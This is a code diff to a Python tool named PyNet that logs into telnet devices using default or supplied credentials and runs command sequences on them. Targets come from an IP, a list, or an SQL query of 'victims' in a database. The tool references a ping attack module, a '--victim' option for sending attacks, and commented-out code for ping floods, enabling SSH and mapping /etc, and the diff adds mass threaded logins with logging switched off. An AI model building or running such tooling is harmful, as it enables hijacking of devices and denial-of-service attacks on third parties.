@@ -27,7 +27,7 @@ from commands.ping_combinations import ping_attack
 remote_sockets = []
 
 # Setup logs feature
-log_number = "5"
+log_number = "6"
 
 def exit_gracefully():
     print("\n\n[!] Exiting gracefully...")
@@ -50,6 +50,7 @@ signal.signal(signal.SIGINT, signal_handler)
 # Function to parse command-line arguments
 def parse_arguments():
     parser = argparse.ArgumentParser(description="PyNet - A Python-based tool for telnet and network operations.")
+    parser.add_argument("-q", "--query", help="\t\tGive SQL query for selecting the devices to login.")
     parser.add_argument("-iL", "--ip_list", help="\t\tPath to a file containing a list of IP addresses or hostnames, one per line.")
     parser.add_argument("-iC", "--commands_list", help="\t\tPath to a file containing a list of telnet commands to execute, one per line.")
     parser.add_argument("-i", "--ip", help="\t\tTarget IP address or hostname to authenticate with.")
@@ -58,6 +59,7 @@ def parse_arguments():
     parser.add_argument("-l", "--login", action="store_true", help="\tSimply login on the target system.")
     parser.add_argument("-c", "--credentials", help="\tPass csv with username and password format for authentication")
     parser.add_argument("-v", "--victim", help="\tTarget victim for sending attacks (IP collection or domain name).")
+    parser.add_argument("-d", "--delay", help="\tDelay in seconds between listed hosts for performing connections.")
     return parser.parse_args()
 
 
@@ -72,6 +74,7 @@ def find_mac_addresses(file_path):
     
     # Join tuples into full MAC address strings
     return ["".join(mac) for mac in mac_addresses]
+
 
 
 
@@ -110,11 +113,13 @@ def main():
 
             if args.credentials:
                 # Handle single session with provided credentials
-                handle_target(args.ip, args.port, commands_seq, 0.1, True, args.credentials) # Log executed commands with True flag
+                #handle_target(args.ip, args.port, commands_seq, 4, True, args.credentials) # Log executed commands with True flag
+                handle_target(args.ip, args.port, commands_seq, 4, False, args.credentials) # Don't log executed commands with True flag
 
             else:
                 # Handle single session with default credentials
                 handle_target(args.ip, args.port, commands_seq, 0.1, True) # Log executed commands with True flag
+                #handle_target(args.ip, args.port, commands_seq, 0.1, False) # Don't log executed commands with False flag
 
 
     # Option -iL is provided
@@ -173,43 +178,106 @@ def main():
 
 
                 # Spin up our client thread to handle incoming data
-                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True))
+                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, False))
+                #target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True))
                 try:
                     target_handler.start()
+                    time.sleep(5)
                 except:
                     continue
 
                 # Delay time between threads
-                delay = 1
-                time.sleep(delay)
+                #delay = 1
+                #time.sleep(delay)
+
+                # Delay between host login
+                #if args.delay:
+                #    delay_between_ips = int(args.delay)
+                #    time.sleep(delay_between_ips)
+                #else:
+                #    time.sleep(1)
 
             #ip_cont += 1
 
+    # -q option is provided for executing the query and select victims from database
+    elif args.query:
+
+        # Fetch victims from database
+        conn = conn_simple()
+        if conn:
+            cursor = conn.cursor()
+            try:
+                # Execute the query passed in args.query
+                cursor.execute(args.query)
+
+                # Fetch all rows of the result
+                results = cursor.fetchall()
+
+                # Print results (or process them as needed)
+                for row in results:
+                    ip = row[0]
+                    
+                    # Receive list of commands through the args
+                    if args.commands_list:
+                        commands_seq = encode_commands(args.commands_list)  # This method comes from telnet_combinations.py
+
+                    # Spin up our client thread to handle incoming data
+                    target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True))
+                    try:
+                        target_handler.start()
+                        #time.sleep(0.1)
+
+                        # This slow down the login process but is more reliable
+                        target_handler.join()
+
+                    except Exception as e:
+                        print(f"[!] Error processing target {ip}: {e}")
+                        continue
+
+            except Exception as e:
+                print(f"[!] Error executing query: {e}")
+            finally:
+                # Close the cursor and connection
+                cursor.close()
+                conn.close()
+        else:
+            print("[!] Connection failed. Cannot execute query.")
+
+        #for ip in ip_addresses:
+        #    change_telnet_password(ip)
+
+
     # Error case
     else:
-        print("Error: Please provide either -iL or -i option to specify the target IP(s).")
+        print("Error: Please provide either -iL or -i option or -q to specify the target IP(s).")
 
 
 # Handle each victim
 def handle_target(ip, port, command_sequence, timeout=2, detail=True, credentials_path="/mnt/Kali/home/grimaldi/Bash/Telnet/pynet/credentials/default.csv"):
 
-    global log_number
-    log_dir =  os.getcwd() + f"/logs{log_number}/" 
-    log_output = log_dir + ip + f"_log{log_number}"
+    if detail:
+        global log_number
+        log_dir =  os.getcwd() + f"/logs/logs{log_number}/" 
+        log_output = log_dir + ip + f"_log{log_number}"
+        log_paths = log_dir + ip + "_paths"
 
-    log_paths = log_dir + ip + "_paths"
+        ## Create the log_dir if not exist
+        if not os.path.exists(log_dir):
+            os.makedirs(log_dir, exist_ok=True)
 
-    ## Create the dir if not exist
-    if not os.path.exists(log_dir):
-        os.makedirs(log_dir, exist_ok=True)
+        # Create and append socket session
+        remote_socket = telnet_auth_sequence(ip, port, credentials_path, log_output)      # log the auth sequence
+        remote_sockets.append(remote_socket)
 
-    # Create and append socket session
-    remote_socket = telnet_auth_sequence(ip, port, credentials_path, log_output)      # log the auth sequence
-    #remote_socket = telnet_auth_sequence(ip, port, credentials_path)                 # don't log the auth sequence
-    remote_sockets.append(remote_socket)
+        # Send sequence of commands
+        response = socket_send_sequence(ip, remote_socket, command_sequence, timeout, detail, log_output)
+    else:
+        remote_socket = telnet_auth_sequence(ip, port, credentials_path)                 # don't log the auth sequence
+        remote_sockets.append(remote_socket)
 
-    # Send sequence of commands
-    response = socket_send_sequence(remote_socket, command_sequence, timeout, detail, log_output)
+        # Send sequence of commands
+        response = socket_send_sequence(ip, remote_socket, command_sequence, timeout, detail)
+
 
     #ping_command = b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n'
     #response = socket_send_command(remote_socket, ping_command, False)
@@ -222,7 +290,7 @@ def handle_target(ip, port, command_sequence, timeout=2, detail=True, credential
     #pseudo_tree(remote_socket, "/etc", 3, log_output, log_paths)
 
     #commands_ssh = enable_ssh(ip, log_output)
-    #response = socket_send_sequence(remote_socket, commands_ssh, timeout, detail, log_output, 10)
+    #response = socket_send_sequence(ip, remote_socket, commands_ssh, timeout, detail, log_output, 10)
 
     # Close the socket after command execution
     if remote_socket:
